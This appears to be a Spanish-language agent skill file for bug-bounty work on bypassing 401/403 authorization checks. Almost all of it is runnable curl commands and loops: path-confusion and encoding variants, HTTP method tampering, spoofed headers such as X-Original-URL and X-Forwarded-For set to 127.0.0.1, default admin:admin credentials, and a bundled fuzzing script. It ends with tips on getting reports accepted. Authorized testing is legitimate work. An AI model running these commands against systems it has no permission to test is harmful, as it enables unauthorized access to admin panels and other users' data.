---
name: 403-bypass
description: "Bypass de controles de autorización 401/403/404: path confusion, verb tampering, header tricks y encoding. Con wordlists de headers y paths."
version: 1.0.0
author: Fr4ndev
license: MIT
platforms: [linux, macos]
metadata:
  tags: [attack, 403, 401, authorization, bypass, access-control]
  tools: [curl, lostfuzzer.sh]
  required: [curl]
  related_skills: [api-swagger-fuzz, loxs-scanner]
  stage: attack
---

# 403/401 Bypass

Endpoint bloqueado que "no es un bug" — casi siempre lo es. Un 403 que devuelva contenido con un truco = IDOR/BAC reportable.

## 1 — Path confusion

```bash
TARGET="https://target.com/admin"
# slash / dot / encoding variants
for p in "$TARGET/" "$TARGET//" "$TARGET/." "$TARGET/./" "$TARGET%20" "$TARGET%09" \
         "$TARGET?" "$TARGET?" "$TARGET#" "$TARGET..;/" "$TARGET;/" "$TARGET%2f" "$TARGET%2e/"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "$p")
  echo "$code $p"
done
```

Wordlists: `wordlists/403_url_payloads.txt`, `wordlists/403_header_payloads.txt`.

## 2 — Verb / method tampering

```bash
for m in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  echo -n "$m "; curl -s -o /dev/null -w "%{http_code}\n" -X $m "$TARGET"
done
# X-HTTP-Method-Override
curl -s -X POST -H "X-HTTP-Method-Override: GET" "$TARGET"
```

## 3 — Header tricks

```bash
# spoofed identity/origin
curl -s -H "X-Original-URL: /admin" https://target.com/
curl -s -H "X-Rewrite-URL: /admin" https://target.com/
curl -s -H "X-Forwarded-For: 127.0.0.1" "$TARGET"
curl -s -H "X-Custom-IP-Authorization: 127.0.0.1" "$TARGET"
curl -s -H "X-Forwarded-Host: localhost" "$TARGET"
curl -s -H "Referer: https://target.com/admin" "$TARGET"
# bypass de auth basic
curl -s -u "admin:admin" "$TARGET"
```

## 4 — Fuzzing masivo (bundled)

```bash
bash tools/scripts/lostfuzzer.sh https://target.com /admin
```

## 5 — Después del bypass

1. ¿Contiene datos de otros usuarios? → **IDOR / BAC** (severity alto)
2. ¿Es panel admin sin auth? → **broken access control** (crítico)
3. ¿Permite escritura (POST/PATCH)? → impacto directo en integridad

## Reporte

Muestra: request original (403) + request bypass (200 con contenido). Enmarca como "Authorization Bypass" — los triages lo aceptan fácil cuando hay PoC claro. No enumeres/mutes datos de usuarios reales.
